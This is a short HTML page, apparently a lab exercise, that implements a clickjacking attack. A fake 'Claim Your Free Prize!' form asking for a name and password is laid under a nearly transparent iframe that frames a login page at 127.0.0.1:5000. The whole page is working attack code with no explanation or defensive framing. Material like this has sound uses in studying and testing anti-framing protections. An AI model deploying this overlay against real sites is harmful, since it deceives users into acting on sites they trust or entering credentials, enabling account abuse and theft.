<!DOCTYPE html>
<html lang="en">
<head>
    <title>Clickjacking Attack</title>
    <style>
        /* Container to position the iframe correctly */
        .iframe-container {
            position: relative;
            width: 400px;  /* Match the login form width */
            height: 300px; /* Match the login form height */
            margin: 100px auto;
        }
        
        /* Invisible iframe positioned over the enticing "fake" form */
        iframe {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.1; /* Nearly invisible */
            z-index: 10; /* On top of the fake form */
        }
        
        /* Fake form with a higher z-index */
        .fake-form {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 5; /* Underneath iframe */
            text-align: center;
            font-family: Arial, sans-serif;
            color: #333;
            background-color: #fff;
        }
        
        .fake-form h2 {
            margin-top: 20px;
        }
        
        .fake-form input {
            display: block;
            margin: 10px auto;
            padding: 10px;
            width: 80%;
            font-size: 16px;
        }
        
        .fake-form button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #28a745;
            color: white;
            border: none;
            border-radius: 4px;
        }
    </style>
</head>
<body>
    <div class="iframe-container">
        <!-- This is the enticing fake form -->
        <div class="fake-form">
            <h2>Claim Your Free Prize!</h2>
            <p>Enter your details below:</p>
            <input type="text" placeholder="Name">
            <input type="password" placeholder="Password">
            <button onclick="alert('Thank you!')">Claim Prize</button>
        </div>

        <!-- The actual login form embedded in an iframe -->
        <iframe src="http://127.0.0.1:5000/login"></iframe>
    </div>
</body>
</html>
